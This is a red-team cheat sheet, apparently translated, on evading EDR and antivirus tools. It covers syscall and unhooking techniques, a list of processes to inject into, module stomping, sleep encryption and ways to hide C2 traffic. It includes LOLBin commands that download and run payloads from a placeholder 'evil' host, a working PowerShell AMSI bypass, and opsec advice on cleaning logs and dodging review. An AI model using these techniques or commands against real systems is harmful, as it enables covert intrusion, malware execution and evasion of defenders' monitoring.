# EDR/AV Bypass and Covert Operations Quick Check

> Source: Summary of actual combat experience of multiple red teams (2024-2026)
> Applicable scenarios: Reference when operations need to be performed in an environment with EDR/AV protection

---

## Detection layer and corresponding bypass

| detection layer | What does EDR do | bypass idea |
|--------|-----------|---------|
| static signature | matches known malicious file hash/characteristics | custom compilation, encrypted payload, modified characteristics |
| User mode Hook | Hook ntdll.dll monitoring API call | direct system call / Unhooking / built-in ntdll |
| Kernel callback | Registered process/thread/image loading callback | Callback removal (requires driver)/Legal process injection |
| ETW | Collect events via ETW | Patch EtwEventWrite / Disable provider |
| Behavior analysis | Analysis of call sequences and behavior patterns | Delayed execution/distributed operations/simulation of normal behavior |
| Memory scan | Periodic scan of process memory | Heap encryption/Sleep encryption payload/Module stamping |
| Network detection | Analyze outbound traffic characteristics | Domain prefix/Legal service tunnel/Encryption |

---

## Practical bypass techniques

### 1. Direct system calls (bypass user-mode hooks)

```
Principle: Directly use the syscall instruction to call the kernel without passing ntdll.dll
Tools: SysWhispers3/HellsGate/TartarusGate
Effect: Bypass all user-mode Hooks
```

### 2. Unhooking (restore the original ntdll)

```
Method A: Remap ntdll.dll from disk
Method B: Load a clean copy from the KnownDlls directory
Method C: Copy the .text segment from the suspended process
Effect: Restore the Hooked API to its original state
```

### 3. Process injection (select less monitored targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injection:
- lsass.exe (highly monitored)
- svchost.exe (partial EDR focus)
- powershell.exe / cmd.exe
```

### 4. Module stomping

```
Principle: Write the payload into the .text section of the loaded legal DLL
Effect: What you see during memory scanning is a legitimate module, not a suspicious RWX memory.
```

### 5. Sleep encryption (Ekko/Zilean)

```
Principle: Beacon encrypts its own memory during sleep
Effect: The payload feature cannot be found during memory scanning.
Implementation: Register Timer callback, encrypt before sleep, and decrypt after waking up
```

### 6. Call stack spoofing

```
Principle: Forge the call stack to make the API calls appear to come from legitimate code
Effect: Bypass call stack-based behavior detection
```

---

## C2 traffic concealment

| Technology | Principle | Detection Difficulty |
|------|------|---------|
| domain prefix | HTTPS request SNI and Host header are different | high |
| Cloudflare Workers | Relayed via CF, looks normal HTTPS | High |
| Azure/AWS legal service | Use cloud service API to create C2 channel | Extremely high |
| DNS over HTTPS | C2 data encoding in DNS query | in |
| WebSocket | Long connection, mixed with normal Web traffic | Medium |
| ICMP tunnel | Data hidden in ICMP packets | Low (easy to find) |

---

## LOLBins（Living Off the Land）

Use the legitimate programs that come with the system to perform malicious operations:

| Program | Purpose | Command Example |
|------|------|---------|
| certutil | Download file |`certutil -urlcache -split -f http://evil/payload.exe`|
| mshta | execute HTA |`mshta http://evil/payload.hta`|
| rundll32 | Load DLL |`rundll32 evil.dll,EntryPoint`|
| regsvr32 | Load SCT |`regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll`|
| wmic | remote execution |`wmic /node:target process call create "cmd"`|
| msiexec | installation MSI |`msiexec /q /i http://evil/payload.msi`|
| bitsadmin | Download file |`bitsadmin /transfer job http://evil/payload.exe C:\payload.exe`|
| forfiles | execute command |`forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"`|

---

## AMSI Bypass (PowerShell)

```powershell
# Classic Patch (may be detected by signature)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# A more covert way: Reflection modification of AmsiScanBuffer
# Or use PowerShell to downgrade to v2 (without AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Minimum Action Principle** — Don’t touch things that can’t be touched, and don’t create new ones that can use existing credentials.
2. **Time Window** — Operate during target non-working hours (reduces the probability of manual review)
3. **Traffic Mixing** — C2 communication frequency and size simulate normal business traffic
4. **Tools are not dropped to disk** — memory execution, cleared immediately after use
5. **Log Awareness** — Know which operations will generate what logs, avoid them in advance or clean them up afterwards.
6. **Honeypot identification** — Identify honeypots before operating (unusually open services, too tempting credentials)
7. **Step-by-Step** — Don’t do all the steps at once, spread them over multiple time periods
